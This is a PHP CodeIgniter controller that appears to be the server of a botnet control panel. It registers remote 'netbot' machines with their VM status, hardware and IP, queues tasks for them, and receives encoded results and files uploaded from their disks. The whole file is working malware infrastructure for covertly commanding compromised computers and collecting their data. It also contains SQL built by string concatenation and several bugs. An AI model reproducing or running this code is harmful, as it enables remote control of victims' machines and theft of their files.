<?php
if (!defined('BASEPATH')) {
    die('No direct script access allowed');
}
class Bot extends CI_Controller
{
    private $guid = '';
    private $netbots = array();
    public function __construct()
    {
        parent::__construct();
        $this->output->enable_profiler(TRUE);
        //$this->load->helper('date');
        $this->load->helper('bot');
        $this->load->driver('cache', array('adapter' => 'memcached', 'backup' => 'dummy'));
        $this->load->model('bot_mdl', 'bot');
    }
    public function index()
    {
        //$this->benchmark->mark('code_start');
        //$this->benchmark->mark('code_end');
        //echo $this->benchmark->elapsed_time('code_start', 'code_end');
        $this->load->view('test');
    }
    public function gettask()
    {
        $max_online=$this->config->item('max_online');
        $tasklist=array();
        $netbot= array();      
        $netbot_up = array();
        $back_msg = "";
        $back_code=0;
      
      //$this->cache->clean();
      
      $online=$this->cache->get('online');
   	
    	//online +1
    	if($online!==false) $this->cache->increment('online');
    	
    	
    	    if($online>$max_online)
            {
            	if($online!==false)	$this->cache->decrement('online');
            	  show_json_task($tasklist,$back_code,"waiting!"); 
            	
            }
    	
    
    	  //获取任务类型
        $tasktype = $this->uri->segment(3);
        if (empty($tasktype)) {
            $tasktype = 'cron';
        } else {
            $tasktype = $tasktype;
        }
        $this->bot->tasktype = $tasktype;
        
    
        
        //测试代码
        $test = 0;
        if (empty($this->bot->api_post['size'])) {
            $test = 1;
            $str = '{"guid":"1779de7fe206101badd5101aebb0d788","vm":0,"amd64":1,"mem":4800,"mac":"2W-3E-4R-5T-6Y","internet":"internet"}';
            $str = gzcompress($str);
            $str = td_xor_encode($str);
            $this->bot->guid = '1779de7fe206101badd5101aebb0d788';
            $this->bot->api_post['guid'] = '1779de7fe206101badd5101aebb0d788';
            $this->bot->api_post['size'] = strlen($str);
            $this->bot->api_post['data'] = $str;
        }
        //测试代码
         
 
        
        
        //memcached  没有数据跳到最后

        if (!empty($this->bot->guid)) 
        {
            $mc_netbot = $this->cache->get($this->bot->guid);
            if (!empty($mc_netbot)) {
                if ($mc_netbot['nb_task_new'] == 0) { 
                	  $netbot=$mc_netbot; 
                    goto end;
                }
                
            }else{
            //检查请求数
        
            
            }
            
    
            
        }
        //memcached
        
   
        
        //解开数据    
        $unzip = $this->bot->unzip();
        if(!$unzip) goto end;
       
 
        if (empty($this->bot->guid)) {
        	 //注册GUID
            $tasklist=$this->bot->reg();
            goto end;
            
        } else {
          //获取机器信息
            if (empty($mc_netbot)) {
                $netbot = $this->bot->get_netbot($this->bot->guid);
            } else {
                $netbot = $mc_netbot;
            }

            $this->bot->netbots = $netbot;
        }
        
        //读取任务队列
        if ($tasktype != 'chat') {
            $tasklist = $this->bot->get_tl_cron();
        } else {
            $tasklist = $this->bot->get_tl_chat();
        }
        
           if (!empty($tasklist)) {
            $netbot_up['nb_task_new'] = 1;
            $netbot['nb_task_new'] = 1;  
            //更新数据为已发送状态
            foreach ($tasklist as $key => $tl) {
                $this->db->query('update  tasklist_' . $tl['tl_type'] . ' set tl_stauts=1  where tl_id=' . $tl['tl_id']);
            }
            $back_code=1;   
        } else {
            $netbot_up['nb_task_new'] = 0;
            $netbot['nb_task_new'] = 0; 
            $back_msg="no data!";           
        }
        
        
        
        
        end:
        
        if($this->bot->error_msg=="")
        {
        
     
        
        if ($tasktype == 'chat') {
            $netbot_up['nb_stauts'] = 2;
            
            //激活状态改变
            if ($netbot['nb_stauts'] != 2) {
                $clup = array();
                $clup['stauts'] = 1;
                $this->bot->cl_up($guid, $clup);
            }
             $netbot['nb_stauts'] = 2;
        } else {
            $netbot_up['nb_stauts'] = 1;
            //停止激活
            if ($netbot['nb_stauts'] == 2) {
                $this->bot->cl_del($guid);
            }
             $netbot['nb_stauts'] = 1;
        }
        
         //更新数据和缓存
         $netbot_up['nb_lasttime'] = $this->bot->thistime;
         $netbot_up['nb_lastip'] = $this->bot->lastip;
         $netbot['nb_lasttime'] = $this->bot->thistime;
         $netbot['nb_lastip'] = $this->bot->lastip;
         
          $this->cache->save($this->bot->guid, $netbot, $this->bot->mc_time);
          $this->bot->update_netbot($this->bot->guid, $netbot_up);
        
        
        }else{
          $back_msg=$this->bot->error_msg;
        }
           //online -1
        if($online!==false)	$this->cache->decrement('online');
        
        if ($test) {
        	  print_r($netbot);
        	  echo "<hr>".$online."<hr>";
            show_json_task_test($tasklist,$back_code,$back_msg);  
            $this->load->view('welcome_message');
            //exit;
        } else {       
         show_json_task($tasklist,$back_code,$back_msg);        
        }
  
    }
    
    public function push()
    {
        $netbot= array();      
        $back_msg = "";
        $back_code=0;
       //测试代码
        $test = 0;
        if (empty($this->bot->api_post['size'])) {
            $test = 1;
            $str = '{"code":1,"info":"","tl_netbot":"1779de7fe206101badd5101aebb0d788","tl_id":"1","tl_taskid":"1","tl_type":"cron","tl_backfun":"pathList","filepath":"","data":[]}';
            $str = gzcompress($str);
            $str = td_xor_encode($str);
            $this->bot->guid = '1779de7fe206101badd5101aebb0d788';
            $this->bot->api_post['guid'] = '1779de7fe206101badd5101aebb0d788';
            $this->bot->api_post['size'] = strlen($str);
            $this->bot->api_post['data'] = $str;
        }
        //测试代码
    
        //解开数据    
        $unzip = $this->bot->unzip(1);
        if(!$unzip) goto end;
        
        if (empty($this->bot->guid)) {
        $this->error_msg= "guid不正确";
        goto end;	
        }
        
         $mc_netbot = $this->cache->get($this->bot->guid);
          if (empty($mc_netbot)) {
                $netbot = $this->bot->get_netbot($this->bot->guid);
            } else {
                $netbot = $mc_netbot;
            }

        $this->bot->netbots = $netbot;
        
        
  
        $tlu = array();
        $tlu['tl_data'] = $this->bot->json_data;
        $tlu['tl_finishtime'] = date('Y-m-d H:i:s');       
        $tlu['tl_stauts'] = 2;
        $tlu['tl_code'] = $this->bot->pnetbot['code'];
        $tlu['tl_info'] = $this->bot->pnetbot['info'];
        //进入回调函数处理
        //接收文件
        if (isset($_FILES['taskfile'])) {
            $this->load->library('Uploadtask');
            $upfiles = new Uploadtask();
            $upfiles->upload_target_dir = $this->config->item('upload_path') . '/' . $this->bot->pnetbot['tl_netbot'];
            $upfiles->upload_target_name = $this->bot->pnetbot['tl_id'];
            $taskfile = $upfiles->upload_file();
            if ($taskfile) {
                //写文件日志
                $file = array();
                $file['tf_name'] = $taskfile['filename'];
                $file['tf_size'] = $taskfile['filesize'];
                $file['tf_addtime'] = date('Y-m-d H:i:s');
                $file['tf_filetype'] = $taskfile['filetype'];
                $file['tf_oldpath'] = $this->bot->pnetbot['filepath'];
                $file['tl_id'] = $this->bot->pnetbot['tl_id'];
                $file['tl_type'] = $this->bot->pnetbot['tl_type'];
                $file['tl_taskid'] = $this->bot->pnetbot['tl_taskid'];
                $file['tl_netbot'] = $this->bot->pnetbot['tl_netbot'];
                $file['tl_backfun'] = $this->bot->pnetbot['tl_backfun'];
                $this->bot->task_files_insert($file);
                
                $tlu['tl_filename'] = $taskfile['filename'];
                $tlu['tl_oldpath'] = $this->bot->pnetbot['filepath'];
            } else {
               
                 $this->error_msg= "upload fail";
                 goto end;	
            }
        }
        
       
         if(!empty($this->bot->pnetbot['tl_backfun'])){
        
        	if (file_exists(APPPATH."models/backfun/".$this->bot->pnetbot['tl_backfun']."_mdl.php"))
        	{
        
		
          $this->load->model("backfun/".$this->bot->pnetbot['tl_backfun']."_mdl","go");          
          $go=$this->go->go(); 
          if($go!=true)
          {         	
                 $this->error_msg= "回调过程出错！";
                 goto end;	
          }
          
          }
          
        }
        //调试日志
        $path_hash = $this->bot->pnetbot['tl_id'];
        $file_path = $this->config->item('tasktmp_path')."/".$this->bot->pnetbot['tl_type'];
        $file_path = $file_path . '/' . $path_hash . '.txt';
        write_file($file_path, $this->bot->json_data);
        //调试日志
        
        //更新队列
        $this->bot->tasklist_update($this->bot->pnetbot['tl_id'], $tlu, $this->bot->pnetbot['tl_type']);
        
        end:
         $back_msg=$this->bot->error_msg;  
         if ($test) {
            show_json_task_test(null,$back_code,$back_msg);  
            $this->load->view('welcome_message');
            //exit;
        } else {
             
         show_json_task(null,$back_code,$back_msg);        
        }
       
    }
    
    public function test()
    {
        $netbot = array();
        $netbot['guid'] = '1779de7fe206101badd5101aebb0d788';
        $netbot['vm'] = 0;
        $netbot['amd64'] = 1;
        $netbot['mem'] = 4800;
        $netbot['mac'] = '2W-3E-4R-5T-6Y';
        $netbot['internet'] = 'internet';
        show_json2($netbot);
    }
    public function test2()
    {
        $netbot = array();
        $netbot['code'] = 1;
        $netbot['info'] = '';
        $netbot['tl_netbot'] = '1779de7fe206101badd5101aebb0d788';
        $netbot['tl_id'] = '1';
        $netbot['tl_taskid'] = '1';
        $netbot['tl_type'] = 'cron';
        $netbot['tl_backfun'] = '';
        $netbot['filepath'] = 'c:/qqq.jpg';
        $netbot['data'] = array();
        show_json2($netbot);
    }
    public function test4()
    {
        $str = '6.1.1';
        $ip = substr($str, 0, strlen($str) - 2);
        $this->config->load('os', TRUE);
        $netbot_os = $this->config->item('netbot_os', 'os');
        print_r($netbot_os);
    }
    public function test3()
    {
        $gexp = $this->db->query("SELECT nge_group_id FROM netbot_group_expand where nge_netbot_id='9de5f97ef4e078cc1e3b6f975133a168'")->result_array();
     print_r($gexp);
     exit;
     
    }
    public function test5()
    {
    $online=$this->cache->get('online');
    
    $t=0;
    if($online===false) 
    {
    	$this->cache->save('online',$t, 300000);
    }
     echo  "<hr>";
    echo  $online;
    echo  "<hr>";
        //$this->cache->memcached->save('foo', 'bar', 10);
        // $str=  $this->cache->memcached->get('foo');
        //phpinfo();
        //$mc = new Memcache();
        //$mc->addServer('127.0.0.1', '11211', TRUE, 1);
        //$mc->set('num_key', 999);
        //var_dump($mc->get('num_key'));
        //$this->cache->memcached->is_supported();
        //var_dump($this->cache->memcached->get('num_key'));
        //$this->load->driver('cache', array('adapter' => 'memcached', 'backup' => 'apc'));
       // $this->load->driver('cache', array('adapter' => 'memcached', 'backup' => 'dummy'));
       // var_dump($this->cache->get('num_key'));
      // $t=0;
       //$this->cache->save('online',$t, 300000);
  // phpinfo();
    }
}